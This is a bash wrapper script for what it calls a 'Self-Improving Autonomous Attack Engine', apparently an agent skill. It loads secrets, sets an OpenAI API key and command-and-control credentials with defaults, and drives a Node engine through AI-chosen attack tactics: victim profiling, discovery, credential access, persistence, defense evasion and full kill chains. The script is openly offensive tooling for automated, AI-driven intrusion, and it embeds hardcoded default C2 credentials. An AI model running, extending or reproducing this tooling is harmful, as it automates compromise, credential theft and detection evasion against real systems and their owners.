#!/bin/bash
# dynamic.sh v3.0 — Self-Improving Autonomous Attack Engine Wrapper

set -a
source /home/ocuser/.openclaw/secrets/.env 2>/dev/null
set +a

export OPENAI_API_KEY="${OPENAI_API_KEY:-}"
export C2_PASSWORD="${C2_PASSWORD:-admin123}"
export C2_BASE_URL="${C2_BASE_URL:-http://172.20.0.10:8000}"
export C2_USERNAME="${C2_USERNAME:-admin}"

SKILL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENGINE="$SKILL_DIR/learning-engine.js"

CMD="${1:-help}"
shift 2>/dev/null

case "$CMD" in
  auto)
    TACTIC="${1:-discovery}"
    echo "🤖 Auto attack: $TACTIC"
    node "$ENGINE" run --tactic "$TACTIC" --techniques 3 --retries 2 --wait 12
    ;;
  smart)
    TACTIC="${1:-discovery}"
    echo "🧠 Smart attack: $TACTIC"
    node "$ENGINE" run --tactic "$TACTIC" --techniques 5 --retries 3 --wait 15
    ;;
  learnall)
    echo "🔄 Full kill chain"
    node "$ENGINE" fullchain --tactics "discovery,credential-access,persistence,defense-evasion" --iterations 3 --retries 3 --wait 12
    ;;
  profile)
    echo "🔍 Profiling victim..."
    node "$ENGINE" profile
    ;;
  evolve)
    echo "🧬 Evolving strategy..."
    node "$ENGINE" evolve
    ;;
  learned)
    node "$ENGINE" knowledge
    ;;
  stats)
    node "$ENGINE" stats
    ;;
  export)
    node "$ENGINE" export-research
    ;;
  reset)
    node "$ENGINE" reset-session
    ;;
  chain)
    TACTICS="${1:-discovery,credential-access,persistence}"
    node "$ENGINE" fullchain --tactics "$TACTICS" --iterations 3 --retries 3 --wait 12
    ;;
  *)
    echo "
Self-Improving Attack Engine v3.0

Commands:
  profile             Profile victim environment
  auto <tactic>       AI attack (3 techniques)
  smart <tactic>      Full retry loop (5 techniques)
  learnall            Full kill chain — 4 tactics
  chain <t1,t2,t3>    Custom tactic chain
  evolve              Force strategy evolution
  learned             Knowledge base
  stats               Statistics with detection rates
  export              Export research data
  reset               Reset session

Recommended flow:
  dynamic.sh profile         # fingerprint victim first
  dynamic.sh smart discovery # run with context
  dynamic.sh stats           # check learning
  dynamic.sh learnall        # full chain
"
    ;;
esac
